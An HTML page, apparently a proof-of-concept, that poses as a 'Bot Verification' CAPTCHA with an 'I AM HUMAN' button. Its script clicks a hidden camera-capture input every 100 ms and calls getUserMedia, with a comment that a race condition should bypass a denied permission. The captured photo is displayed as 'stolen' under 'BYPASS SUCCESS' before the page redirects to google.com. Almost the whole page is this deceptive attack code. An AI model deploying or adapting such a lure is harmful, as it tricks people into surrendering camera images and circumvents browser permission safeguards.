<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    />
    <title>Tester</title>
    <style>
      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
          Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background: #f0f2f5;
        margin: 0;
        padding: 20px;
        box-sizing: border-box;
      }
      #ui-container {
        background: white;
        padding: 30px;
        border-radius: 16px;
        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
        text-align: center;
        width: 100%;
        max-width: 450px;
      }
      h2 {
        margin-top: 0;
        color: #1c1e21;
      }
      p {
        color: #606770;
        line-height: 1.5;
        margin-bottom: 25px;
      }
      .btn {
        width: 100%;
        padding: 16px;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 18px;
        font-weight: bold;
        -webkit-tap-highlight-color: transparent;
      }
      #stolen-img {
        width: 100%;
        border-radius: 12px;
        border: 4px solid #dc3545;
        margin-top: 20px;
        display: none;
      }
      .hidden {
        display: none;
      }
    </style>
  </head>
  <body>
    <div id="ui-container">
      <div id="setup">
        <div style="font-size: 50px; margin-bottom: 10px"></div>
        <h1>Bot Verification</h1>
        <p>
          <b>Instruction:</b> Click the button to start verification. The system
          will automatically sync with your secure camera module.
        </p>
        <button id="verify-btn" class="btn">I AM HUMAN</button>
      </div>

      <div id="result" class="hidden">
        <h2 style="color: #dc3545">BYPASS SUCCESS</h2>
        <p>Status : CAPTURED</p>
        <img id="stolen-img" />
      </div>
    </div>

    <input
      type="file"
      id="cam"
      accept="image/*"
      capture="environment"
      class="hidden"
    />

    <script>
      const btn = document.getElementById("verify-btn");
      const cam = document.getElementById("cam");
      const setupDiv = document.getElementById("setup");
      const resultDiv = document.getElementById("result");
      const stolenImg = document.getElementById("stolen-img");

      btn.onclick = async () => {
        btn.innerText = "Analyzing...";
        btn.disabled = true;

        const race = setInterval(() => {
          console.log("Triggering camera intent...");
          cam.click();
        }, 100);

        try {
          await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (e) {
          console.log("Permission denied. Race condition should bypass.");
        }

        setTimeout(() => clearInterval(race), 10000);
      };

      cam.onchange = () => {
        const file = cam.files[0];
        if (file) {
          stolenImg.src = URL.createObjectURL(file);
          setupDiv.classList.add("hidden");
          resultDiv.classList.remove("hidden");
          stolenImg.style.display = "block";

          setTimeout(() => {
            alert("Verification Success! Redirecting...");
            window.location.href = "https://google.com";
          }, 800);
        }
      };
    </script>
  </body>
</html>
